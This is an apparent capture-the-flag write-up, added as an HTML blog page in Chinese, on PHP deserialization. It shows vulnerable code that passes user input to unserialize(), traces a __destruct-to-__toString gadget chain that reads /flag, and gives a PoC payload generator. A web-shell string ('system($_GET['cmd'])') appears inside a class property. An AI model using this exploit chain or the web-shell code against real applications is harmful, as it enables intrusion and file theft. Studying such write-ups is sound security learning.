@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <title>文章详情 - 可爱又帅气的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <style>
+    body {
+      background: #fffafc;
+      color: #333;
+      font-family: 'Comic Sans MS', 'Chalkboard SE', cursive;
+      padding: 30px;
+      line-height: 1.7;
+    }
+    .container {
+      max-width: 960px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      padding: 30px;
+    }
+    h1, h2, h3, h4 {
+      color: #ff69b4;
+    }
+    pre code {
+      font-family: 'Fira Code', 'Courier New', monospace;
+      font-size: 14px;
+      border-radius: 10px;
+      padding: 15px;
+      background: #f4f4f4;
+      display: block;
+      overflow-x: auto;
+    }
+    details {
+      background: #fdf0f5;
+      border: 1px solid #ffb6c1;
+      border-radius: 10px;
+      padding: 10px 15px;
+      margin-bottom: 1em;
+    }
+    details summary {
+      cursor: pointer;
+      font-weight: bold;
+      color: #d63384;
+    }
+    .copy-button {
+      float: right;
+      margin-top: -40px;
+      margin-right: 10px;
+      background: #ffb6c1;
+      border: none;
+      border-radius: 8px;
+      padding: 5px 10px;
+      font-size: 12px;
+      cursor: pointer;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <h1>PHP 反序列化漏洞分析</h1>
+
+  <p><strong>以下是完整源码：</strong></p>
+  <details open>
+    <summary>点我展开 / 折叠代码</summary>
+    <button class="copy-button">复制</button>
+    <pre><code class="php">&lt;?php
+class FlagReader {
+    private $logfile = "/tmp/log.txt";
+    protected $content = "&lt;?php system(\$_GET['cmd']); ?&gt;";
+    public function __toString() {
+        if (file_exists('/flag')) {
+            return file_get_contents('/flag');
+        } else {
+            return "Flag file not found!";
+        }
+    }
+}
+
+class DataValidator {
+    public static function check($input) {
+        $filtered = preg_replace('/[^\w]/', '', $input);
+        return strlen($filtered) &gt; 10 ? true : false;
+    }
+    public function __invoke($data) {
+        return self::check($data);
+    }
+}
+
+class FakeDanger {
+    private $buffer;
+    public function __construct($data) {
+        $this-&gt;buffer = base64_encode($data);
+    }
+    public function __wakeup() {
+        if (rand(0, 100) &gt; 50) {
+            $this-&gt;buffer = str_rot13($this-&gt;buffer);
+        }
+    }
+}
+
+class VulnerableClass {
+    public $logger;
+    private $debugMode = false;
+    public function __destruct() {
+        if ($this-&gt;debugMode) {
+            echo $this-&gt;logger;
+        } else {
+            $this-&gt;cleanup();
+        }
+    }
+    private function cleanup() {
+        if ($this-&gt;logger instanceof DataValidator) {
+            $this-&gt;logger = null;
+        }
+    }
+}
+
+function sanitize_input($data) {
+    $data = trim($data);
+    return htmlspecialchars($data, ENT_QUOTES);
+}
+
+if(isset($_GET['data'])) {
+    $raw = base64_decode($_GET['data']);
+    if (preg_match('/^[a-zA-Z0-9\/+]+={0,2}$/', $_GET['data'])) {
+        unserialize($raw); 
+    }
+} else {
+    highlight_file(__FILE__);
+}
+</code></pre>
+  </details>
+
+  <h2>分析步骤</h2>
+  <ol>
+    <li>GET 传入 <code>$data</code>，触发 <code>unserialize($raw);</code></li>
+
+    <li>
+      <code>__destruct()</code> 对象销毁时触发。
+      <pre><code class="php">class VulnerableClass {
+      public $logger;
+      private $debugMode = false;
+      public function __destruct() {
+          if ($this-&gt;debugMode) {  // 若$this-&gt;debugMode为真
+              echo $this-&gt;logger;  // 则触发 __toString()
+          } else {
+              $this-&gt;cleanup();
+          }
+      }
+  }</code></pre>
+    </li>
+
+    <li>
+      <code>__toString()</code> 对象被当作字符串使用时触发。
+      <pre><code class="php">class FlagReader {
+      private $logfile = "/tmp/log.txt";
+      protected $content = "&lt;?php system(\$_GET['cmd']); ?&gt;";
+      public function __toString() {
+          if (file_exists('/flag')) {
+              return file_get_contents('/flag');
+          } else {
+              return "Flag file not found!";
+          }
+      }
+  }</code></pre>
+    </li>
+
+    <li>所以只要让 <code>VulnerableClass -&gt; debugMode == true</code>，从而触发 <code>__toString()</code> 就好了。</li>
+  </ol>
+
+<h2>PoC 示例</h2>
+<details>
+  <summary>点击查看 POC</summary>
+  <button class="copy-button">复制</button>
+  <pre><code class="php">&lt;?php
+class FlagReader {
+    private $logfile = "/tmp/log.txt";
+    protected $content = "&lt;?php system(\$_GET['cmd']); ?&gt;";
+}
+
+class FakeDanger {
+}
+
+class VulnerableClass {
+    public $logger;
+    private $debugMode;
+    public function __construct() {
+        $this -&gt; logger = new FlagReader();
+        $this -&gt; debugMode = true;
+    }
+}
+
+$obj = new VulnerableClass();
+echo base64_encode(serialize($obj));
+</code></pre>
+</details>
+
+<blockquote>
+  <p><strong>为什么 <code>$this -&gt; logger = new FlagReader();</code> 可以得到 flag，<br>
+     而 <code>$this -&gt; logger = new FakeDanger();</code> 就不行？</strong></p>
+  <p>因为题目中的 <code>FlagReader</code> 类中定义了 <code>__toString()</code> 方法，<code>FakeDanger</code> 类却没有。<br>
+  所以当执行 <code>echo new FlagReader();</code> 时，会调用其 <code>__toString()</code> 方法，完美命中。</p>
+</blockquote>
+
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+<script>
+  // 复制按钮逻辑
+  document.querySelectorAll('.copy-button').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const code = btn.nextElementSibling.querySelector('code');
+      navigator.clipboard.writeText(code.innerText).then(() => {
+        btn.innerText = '已复制';
+        setTimeout(() => btn.innerText = '复制', 1500);
+      });
+    });
+  });
+</script>
+</body>
+</html>
